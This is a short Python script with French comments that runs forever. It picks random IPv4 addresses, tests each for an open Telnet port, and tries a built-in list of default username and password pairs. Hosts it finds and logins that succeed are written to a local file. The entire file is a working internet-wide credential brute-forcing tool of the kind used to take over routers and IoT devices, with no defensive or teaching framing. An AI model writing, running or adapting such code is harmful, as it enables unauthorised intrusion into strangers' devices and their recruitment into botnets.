import socket
import random
import time
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import telnetlib


def generer_ip() -> str:
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def telnet_connect(host: str, username: str, password: str, port: int = 23,
                   timeout: float = 5.0) -> bool:
    """
    Se connecte à une machine via Telnet avec identifiant et mot de passe.

    :param host: adresse IP ou hostname
    :param username: nom d'utilisateur
    :param password: mot de passe
    :param port: port Telnet (défaut : 23)
    :param timeout: délai max en secondes
    :return: objet Telnet connecté, ou None si échec
    """
    try:
        tn = telnetlib.Telnet(host, port, timeout)

        # Attente du prompt "login:" ou "Username:"
        tn.read_until(b"login: ", timeout=timeout)
        tn.write(username.encode("ascii") + b"\n")

        # Attente du prompt "Password:"
        tn.read_until(b"Password: ", timeout=timeout)
        tn.write(password.encode("ascii") + b"\n")

        # Laisser le temps à la session de s'établir
        time.sleep(1)

        # Lire la réponse initiale
        response = tn.read_very_eager().decode("ascii", errors="ignore")
        print(f"[+] Connecté ! Réponse initiale :\n{response}")

        return True

    except Exception as e:
        print(f"[-] Échec de connexion : {e}")
        return False


def check_telnet(host: str, port: int = 23, timeout: float = 3.0) -> bool:
    """
    Vérifie si le port Telnet (23) est ouvert sur une machine.

    :param host: adresse IP ou hostname cible
    :param port: port à tester (défaut : 23)
    :param timeout: délai max en secondes (défaut : 3s)
    :return: True si le port est ouvert, False sinon
    """
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


credentials = {
    "admin": "admin",
    "root": "123456",
    "admin_2": "123456",
    "admin_3": "password",
    "admin_4": "admin123",
    "user": "123456",
    "user_2": "password",
    "root": "root",
    "test": "test",
    "guest": "guest",
    "administrator": "admin"
}


def main():
    ip = generer_ip()
    result = check_telnet(ip)
    print('hello')
    if result:
        print(result, ip)
        with open("hey.txt", "a") as f:
            f.write(f"{ip}\n")
        for username in credentials:
            password = credentials[username]
            telnet_is = telnet_connect(ip, username, password)
            if telnet_is:
                print(f'telnet ok for {ip} avec username = {username} et password = {password}')
                with open("hey.txt", "a") as f:
                    f.write(f"telnet ok for {ip} avec username = {username} et password = {password}\n")


while True:
    main()
    time.sleep(5)


